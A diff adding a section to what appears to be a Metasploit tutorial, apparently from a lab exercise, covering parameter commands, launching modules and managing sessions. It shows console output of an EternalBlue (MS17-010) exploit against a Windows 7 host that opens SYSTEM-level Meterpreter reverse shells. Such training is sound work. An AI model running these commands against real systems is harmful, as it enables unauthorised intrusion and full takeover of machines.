@@ -628,3 +628,158 @@ Parameters you will often use are:
 - LPORT: “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
 - SESSION: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.
 
+You can override any set parameter using the set command again with a different value. You can also clear any parameter value using the unset command or clear all set parameters with the `unset all` command.
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
+Flushing datastore...
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
+```
+You can use the setg command to set values that will be used for all modules. The setg command is used like the set command. The difference is that if you use the set command to set a value using a module and you switch to another module, you will need to set the value again. The setg command allows you to set the value so it can be used by default across different modules. You can clear any value set with `setg` using `unsetg`.  
+The example below uses the following flow;
+1. We use the ms17_010_eternalblue exploitable
+2. We set the RHOSTS variable using the setg command instead of the set command
+3. We use the back command to leave the exploit context
+4. We use an auxiliary (this module is a scanner to discover MS17-010 vulnerabilities)
+5. The show options command shows the RHOSTS parameter is already populated with the IP address of the target system.
+```
+msf6 > use exploit/windows/smb/ms17_010_eternalblue 
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
+rhosts => 10.10.165.39
+msf6 exploit(windows/smb/ms17_010_eternalblue) > back
+msf6 > use auxiliary/scanner/smb/smb_ms17_010 
+msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting                                                Required  Description
+   ----         ---------------                                                --------  -----------
+   CHECK_ARCH   true                                                           no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                                                           no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                                                          no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /opt/metasploit-framework-5101/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS       10.10.165.39                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
+   RPORT        445                                                            yes       The SMB service port (TCP)
+   SMBDomain    .                                                              no        The Windows domain to use for authentication
+   SMBPass                                                                     no        The password for the specified username
+   SMBUser                                                                     no        The username to authenticate as
+   THREADS      1                                                              yes       The number of concurrent threads (max one per host)
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) >
+```
+The setg command sets a global value that will be used until you exit Metasploit or clear it using the unsetg command.  
+
+### Using modules
+Once all module parameters are set, you can launch the module using the `exploit` command. Metasploit also supports the `run` command, which is an alias created for the exploit command as the word exploit did not make sense when using modules that were not exploits (port scanners, vulnerability scanners, etc.).  
+The exploit command can be used without any parameters or using the “-z” parameter.  
+The `exploit -z` command will run the exploit and background the session as soon as it opens.
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
+
+[*] Started reverse TCP handler on 10.10.44.70:4444 
+[*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.12.229:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.12.229:445 - Connecting to target for exploitation.
+[+] 10.10.12.229:445 - Connection established for exploitation.
+[+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.12.229:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.12.229:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.12.229:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.12.229:445 - Sending all but last fragment of exploit packet
+[*] 10.10.12.229:445 - Starting non-paged pool grooming
+[+] 10.10.12.229:445 - Sending SMBv2 buffers
+[+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.12.229:445 - Sending final SMBv2 buffers.
+[*] 10.10.12.229:445 - Sending last fragment of exploit packet!
+[*] 10.10.12.229:445 - Receiving response from exploit packet
+[+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.12.229:445 - Sending egg to corrupted connection.
+[*] 10.10.12.229:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201283 bytes) to 10.10.12.229
+[*] Meterpreter session 2 opened (10.10.44.70:4444 -> 10.10.12.229:49186) at 2021-08-20 02:06:48 +0100
+[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Session 2 created in the background.
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
+```
+This will return you the context prompt from which you have run the exploit.  
+Some modules support the `check` option. This will check if the target system is vulnerable without exploiting it.
+
+### Sessions
+Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and Metasploit.  
+You can use the `background` command to background the session prompt and go back to the msfconsole prompt.
+```
+meterpreter > background
+[*] Backgrounding session 2...
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+```
+Alternatively, `CTRL+Z` can be used to background sessions.  
+The `sessions` command can be used from the msfconsole prompt or any context to see the existing sessions.
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > back
+msf6 > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)
+
+msf6 >
+```
+To interact with any session, you can use the `sessions -i` command followed by the desired session number.
+```
+msf6 > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)
+
+msf6 > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter >
+```
